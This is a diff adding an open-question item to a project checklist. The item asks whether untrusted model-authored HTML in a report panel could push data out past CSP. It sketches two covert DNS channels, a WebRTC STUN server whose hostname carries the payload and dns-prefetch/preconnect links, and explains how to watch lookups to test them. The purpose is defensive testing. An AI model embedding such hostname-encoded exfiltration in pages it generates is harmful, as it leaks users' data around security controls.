@@ -65,6 +65,24 @@ Only what genuinely cannot be settled yet; everything else raised along the way 
       released once the agent is actually at its prompt, and in particular that a Claude Code session reopened in a
       directory it has not been trusted with does not have the queued text answer its trust dialog — nothing establishes
       whether its `SessionStart` fires before or after that dialog.
+- [ ] **Whether a report page can push data out through a channel CSP does not reach.** The window's policy closes the
+      one channel that was found and measured — a page navigating its own frame — but CSP has no directive WebKit
+      enforces over WebRTC or over link-based DNS prefetch, and both are reachable with the `allow-scripts` the panel
+      grants. A page could carry a payload in a hostname: `new RTCPeerConnection({iceServers:[{urls:"stun:<payload>.…"}]})`
+      followed by `createOffer()`/`setLocalDescription()`, or a static or dynamically inserted
+      `<link rel="dns-prefetch">` / `rel="preconnect">`. Neither has been exercised, so nothing is established either
+      way; the product docs claim only what was measured. Observe it at the **DNS layer** — these channels leak through
+      a name lookup, so an HTTP listener sees nothing even when the leak works — and give each probe a positive control,
+      since a check expecting "no" proves nothing without one. Two things make this awkward and are worth knowing before
+      starting: `tcpdump` needs a password, and the window's own policy blocks every in-app channel, so there is no
+      in-app request to use as the control (Safari's lookups go through the same WebKit networking path and can serve as
+      one instead). A non-root observation point that was validated: `log stream --predicate 'process == "mDNSResponder"'
+      --style compact` logs every lookup, and although hostnames are redacted, the mask hash is name-derived and stable
+      within a boot — so looking the same names up from a shell afterwards yields the hashes to search the capture for.
+      Needs a person only in that the screen must be unlocked: the panel renders only for a *selected* hub session, and
+      the application auto-selects only a session it opened itself, so mounting it takes a real click. If a leak is
+      found, there is nothing in CSP to fix it with — record it as a limitation of showing untrusted model-authored HTML
+      and say so in `docs/product/report-panel.md`.
 - [ ] **The hub and its projects on different agents.** Confirm a console whose hub is one agent and whose projects
       default to another orchestrates normally, and that the hub's `start_session` `agent` argument overrides a
       project's default for that one session.
